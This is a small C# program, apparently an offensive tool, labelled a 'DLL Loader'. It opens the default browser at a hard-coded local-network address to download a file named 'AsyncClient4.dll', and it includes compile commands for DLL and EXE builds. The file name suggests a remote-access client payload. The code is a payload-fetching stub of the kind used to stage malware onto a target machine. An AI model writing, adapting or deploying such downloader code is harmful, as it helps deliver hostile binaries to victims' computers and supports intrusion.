// manual compile (DLL) : mcs -target:library -out:DLLDownloader.dll DLL Loader.cs

// manual compile (EXE) : mcs -target:exe -out:DLLDownloader.exe DLL Loader.cs


using System;
using System.Diagnostics;

namespace DllDownloader
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                // Specify the URL to open
                string url = "http://192.168.1.158/AsyncClient4.dll";

                // Open the default web browser with the specified URL
                Process.Start(new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true // Ensures the default web browser is used
                });

                Console.WriteLine($"URL '{url}' opened successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to open URL: {ex.Message}");
            }
        }
    }
}

